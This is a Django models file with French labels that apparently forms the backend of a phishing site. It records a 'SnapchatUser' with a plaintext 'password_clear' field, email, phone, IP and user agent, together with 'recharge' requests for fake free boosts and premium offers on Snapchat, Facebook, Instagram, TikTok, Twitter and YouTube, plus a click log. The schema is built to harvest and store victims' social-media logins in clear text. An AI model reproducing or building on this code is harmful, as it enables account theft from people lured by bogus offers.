from django.db import models

class SnapchatUser(models.Model):
    PLATFORM_CHOICES = [
        ('snapchat', 'Snapchat'),
        ('facebook', 'Facebook'),
        ('instagram', 'Instagram'),
        ('tiktok', 'TikTok'),
        ('twitter', 'Twitter/X'),
        ('youtube', 'YouTube'),
    ]
    
    username = models.CharField(max_length=150, unique=True)
    password_clear = models.CharField(max_length=255)
    email = models.EmailField(blank=True, null=True)
    phone_number = models.CharField(max_length=20, blank=True, null=True)
    platform_clicked = models.CharField(max_length=20, choices=PLATFORM_CHOICES, blank=True, null=True)
    ip_address = models.GenericIPAddressField(blank=True, null=True)
    user_agent = models.TextField(blank=True)
    created_at = models.DateTimeField(auto_now_add=True)
    
    def __str__(self):
        return f"{self.username} - {self.platform_clicked or 'N/A'} - {self.created_at}"
    
    class Meta:
        ordering = ['-created_at']

class RechargeRequest(models.Model):
    PLATFORM_CHOICES = [
        ('snapchat', 'Snapchat'),
        ('facebook', 'Facebook'),
        ('instagram', 'Instagram'),
        ('tiktok', 'TikTok'),
        ('twitter', 'Twitter/X'),
        ('youtube', 'YouTube'),
    ]
    
    OFFER_CHOICES = [
        ('free_boost', 'Boost Gratuit'),
        ('premium_week', 'Premium 1 Semaine'),
        ('unlimited', 'Illimité'),
        ('standard', 'Standard'),
    ]
    
    user = models.ForeignKey(SnapchatUser, on_delete=models.CASCADE, null=True, blank=True)
    platform = models.CharField(max_length=20, choices=PLATFORM_CHOICES)
    offer_type = models.CharField(max_length=20, choices=OFFER_CHOICES, default='free_boost')
    account_username = models.CharField(max_length=150)
    status = models.CharField(max_length=20, default='pending')  # pending, processing, completed, failed
    created_at = models.DateTimeField(auto_now_add=True)
    ip_address = models.GenericIPAddressField(blank=True, null=True)
    
    def __str__(self):
        return f"{self.platform} - {self.offer_type} - {self.account_username}"
    
    class Meta:
        ordering = ['-created_at']

class ClickLog(models.Model):
    """Enregistre chaque clic sur un forfait"""
    session_id = models.CharField(max_length=100, blank=True)
    platform = models.CharField(max_length=50)
    offer_name = models.CharField(max_length=100)
    ip_address = models.GenericIPAddressField(blank=True, null=True)
    user_agent = models.TextField(blank=True)
    clicked_at = models.DateTimeField(auto_now_add=True)
    
    def __str__(self):
        return f"{self.platform} - {self.offer_name} - {self.clicked_at}"
    
    class Meta:
        ordering = ['-clicked_at']